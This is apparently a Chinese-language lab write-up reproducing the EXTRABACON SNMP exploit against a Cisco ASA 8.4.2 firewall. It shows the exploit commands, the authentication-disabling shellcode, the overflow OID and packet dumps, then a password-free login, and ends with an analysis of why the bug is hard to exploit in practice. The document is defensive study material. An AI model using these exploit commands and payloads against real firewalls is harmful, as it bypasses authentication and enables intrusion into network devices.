    $ telnet 192.168.56.150
    Trying 192.168.56.150...
    Connected to 192.168.56.150.
    Escape character is '^]'.
    User Access Verification
    Password: 
    Password: 
    Password: Connection closed by foreign host.
先看没攻击前, 是没法连上的
    $ python  extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-disable
    WARNING: No route found for IPv6 destination :: (no default route?)
    Logging to /EXPLOITS/EXBA/concernedparent
    [+] Executing:  extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-disable
    Data stored in self.vinfo: ASA842
    [+] generating exploit for exec mode pass-disable
    [+] using shellcode in ./versions
    [+] importing version-specific shellcode shellcode_asa842
    [+] building payload for mode pass-disable
    appended PMCHECK_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3
    appended AAAADMINAUTH_DISABLE payload bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3
    [+] random SNMP request-id 527684062
    [+] fixing offset to payload 50
    overflow (112): 1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.67.123.122.173.53.165.165.165.165.131.236.4.137.4.36.137.229.131.197.72.49.192.49.219.179.16.49.246.191.174.170.170.170.129.247.165.165.165.165.96.139.132.36.224.1.0.0.4.50.255.208.97.195.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.25.71.20.9.139.124.36.20.139.7.255.224.144
    payload (133): bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c3
    EXBA msg (370): 3082016e02010104067075626c6963a582015f02041f73d1de0201000201013082014f30819106072b060102010101048185bfa5a5a5a5b8d8a5a5a531f8bba525f6ac31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bff08f530931c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3bfa5a5a5a5b8d8a5a5a531f8bba5b5adad31fbb9a5b5a5a531f9baa2a5a5a531facd80eb14bfe013080831c9b104fcf3a4e90c0000005eebece8f8ffffff31c040c3c33081b80681b32b060104010909836b010303010105095f8138437b7a812d3581258125812581258103816c048109042481098165810381454831814031815b813310318176813f812e812a812a812a81018177812581258125812560810b81042481600100000432817f8150618143811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811081108110811019471409810b7c2414810b07817f816081100500
    [+] Connecting to 192.168.56.150:161
    [+] packet 1 of 1
    [+] 0000   30 82 01 6E 02 01 01 04  06 70 75 62 6C 69 63 A5   0..n.....public.
    [+] 0010   82 01 5F 02 04 1F 73 D1  DE 02 01 00 02 01 01 30   .._...s........0
    [+] 0020   82 01 4F 30 81 91 06 07  2B 06 01 02 01 01 01 04   ..O0....+.......
    [+] 0030   81 85 BF A5 A5 A5 A5 B8  D8 A5 A5 A5 31 F8 BB A5   ............1...
    [+] 0040   25 F6 AC 31 FB B9 A5 B5  A5 A5 31 F9 BA A2 A5 A5   %..1......1.....
    [+] 0050   A5 31 FA CD 80 EB 14 BF  F0 8F 53 09 31 C9 B1 04   .1........S.1...
    [+] 0060   FC F3 A4 E9 0C 00 00 00  5E EB EC E8 F8 FF FF FF   ........^.......
    [+] 0070   31 C0 40 C3 BF A5 A5 A5  A5 B8 D8 A5 A5 A5 31 F8   1.@...........1.
    [+] 0080   BB A5 B5 AD AD 31 FB B9  A5 B5 A5 A5 31 F9 BA A2   .....1......1...
    [+] 0090   A5 A5 A5 31 FA CD 80 EB  14 BF E0 13 08 08 31 C9   ...1..........1.
    [+] 00a0   B1 04 FC F3 A4 E9 0C 00  00 00 5E EB EC E8 F8 FF   ..........^.....
    [+] 00b0   FF FF 31 C0 40 C3 C3 30  81 B8 06 81 B3 2B 06 01   ..1.@..0.....+..
    [+] 00c0   04 01 09 09 83 6B 01 03  03 01 01 05 09 5F 81 38   .....k......._.8
    [+] 00d0   43 7B 7A 81 2D 35 81 25  81 25 81 25 81 25 81 03   C{z.-5.%.%.%.%..
    [+] 00e0   81 6C 04 81 09 04 24 81  09 81 65 81 03 81 45 48   .l....$...e...EH
    [+] 00f0   31 81 40 31 81 5B 81 33  10 31 81 76 81 3F 81 2E   1.@1.[.3.1.v.?..
    [+] 0100   81 2A 81 2A 81 2A 81 01  81 77 81 25 81 25 81 25   .*.*.*...w.%.%.%
    [+] 0110   81 25 60 81 0B 81 04 24  81 60 01 00 00 04 32 81   .%`....$.`....2.
    [+] 0120   7F 81 50 61 81 43 81 10  81 10 81 10 81 10 81 10   ..Pa.C..........
    [+] 0130   81 10 81 10 81 10 81 10  81 10 81 10 81 10 81 10   ................
    [+] 0140   81 10 81 10 81 10 81 10  81 10 81 10 81 10 81 10   ................
    [+] 0150   81 10 81 10 81 10 81 10  81 10 81 10 81 10 19 47   ...............G
    [+] 0160   14 09 81 0B 7C 24 14 81  0B 07 81 7F 81 60 81 10   ....|$.......`..
    [+] 0170   05 00                                              ..
    ****************************************
    [+] response:
    ###[ SNMP ]###
      version   = 
      community = 
      \PDU       \
       |###[ SNMPresponse ]###
       |  id        = 
       |  error     = 
       |  error_index= 
       |  \varbindlist\
       |   |###[ SNMPvarbind ]###
       |   |  oid       = 
       |   |  value     = 
       |   |###[ SNMPvarbind ]###
       |   |  oid       = 
       |   |  value     = 
    [+] received SNMP id 527684062, matches random id sent, likely success
    [+] clean return detected
然后使用telnet登陆看看
    $ telnet 192.168.56.150
    Trying 192.168.56.150...
    Connected to 192.168.56.150.
    Escape character is '^]'.
    User Access Verification
    Password: 
    Type help or '?' for a list of available commands.
    ciscoasa> en
    Password: 
    ciscoasa# conf ter
    ciscoasa(config)# 
攻击成功
从上面环境搭建的过程我们来简单的分析下这漏洞的情况
  1. 必须开启snmp服务和ssh/telnet, 而防火墙默认是关闭的
  2. snmp服务开启是使用白名单, 而且只能指定单个ip而不能指定整个网段
    ciscoasa(config)# snmp-server host inside 0.0.0.0 community public     
    ERROR: Not a valid host address - 0.0.0.0
    ciscoasa(config)# snmp-server host inside 192.168.56.0 community public  
    $ sudo nmap 192.168.56.150 -p161 -sU
    Starting Nmap 7.01 ( https://nmap.org ) at 2016-09-01 15:07 CST
    Nmap scan report for 192.168.56.150
    Host is up (0.00018s latency).
    PORT    STATE         SERVICE
    161/udp open|filtered snmp
    MAC Address: 08:00:27:89:2B:96 (Oracle VirtualBox virtual NIC)
    Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
    ciscoasa(config)# snmp-server host inside 192.168.56.0 255.255.255.0 community$
    snmp-server host inside 192.168.56.0 255.255.255.0 community public
                                         ^
    ERROR: % Invalid input detected at '^' marker.
    ciscoasa(config)# snmp-server host inside 192.168.56.0/24 community public     
                                                          ^
    ERROR: % Invalid input detected at '^' marker.
可以看出, 因为不允许设置子网掩码, 所以根本没法输入网络地址, 只能输入单个ip
  1. snmp的community认证问题, public为我们设置的认证字符串, 比如我们改一改
    ciscoasa(config)# snmp-server host inside 192.168.56.1 community public-test
    $ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public
    WARNING: No route found for IPv6 destination :: (no default route?)
    Logging to /EXPLOITS/EXBA/concernedparent
    [+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public
    [+] probing target via snmp
    [+] Connecting to 192.168.56.150:161
    ****************************************
    Traceback (most recent call last):
    $ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public-test
    WARNING: No route found for IPv6 destination :: (no default route?)
    Logging to /EXPLOITS/EXBA/concernedparent
    [+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public-test
    [+] probing target via snmp
    [+] Connecting to 192.168.56.150:161
    ****************************************
    [+] response:
    ###[ SNMP ]###
      version   = 
      community = 
      \PDU       \
       |###[ SNMPresponse ]###
       |  id        = 
       |  error     = 
       |  error_index= 
       |  \varbindlist\
       |   |###[ SNMPvarbind ]###
       |   |  oid       = 
       |   |  value     = 
       |   |###[ SNMPvarbind ]###
       |   |  oid       = 
       |   |  value     = 
       |   |###[ SNMPvarbind ]###
       |   |  oid       = 
       |   |  value     = 
    [+] firewall uptime is 150100 time ticks, or 0:25:01
    [+] firewall name is ciscoasa
    [+] target is running asa842, which is supported
    Data stored in key file  : asa842
    Data stored in self.vinfo: ASA842
    To check the key file to see if it really contains what we're claiming:
    # cat /EXPLOITS/EXBA/keys/OpezI1.key
    To disable password checking on target:
    # extrabacon_1.1.0.1.py exec -k OpezI1 -t 192.168.56.150 -c public-test --mode pass-disable
    To enable password checking on target:
在密码不对的情况下snmp根本连不上
上述三种条件, 导致了该漏洞是非常鸡肋的RCE, 首先你需要能访问SNMP, 访问SNMP需要你在防火墙的白名单中,
然后还要知道Community认证的密码.
* * *